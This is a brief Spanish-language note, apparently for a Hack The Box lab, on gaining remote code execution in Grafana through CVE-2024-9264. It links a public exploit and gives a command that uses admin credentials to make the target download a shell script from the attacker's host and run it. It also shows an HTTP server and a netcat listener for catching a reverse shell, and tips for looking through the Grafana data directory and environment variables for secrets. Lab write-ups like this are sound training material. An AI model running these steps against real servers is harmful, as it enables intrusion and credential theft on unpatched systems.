# v11 -RCE

```bash
https://github.com/nollium/CVE-2024-9264

#creas un shell.sh

python3 CVE-2024-9264.py -u 'admin' -p '0D5oT70Fq13EvB5r' -c 'wget http://10.10.14.10/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh' http://grafana.planning.htb/


python3 -m http.server 80

nc -lvnp $PORT
```

- Buscar
```bash
/var/lib/grafana


o 

env
```
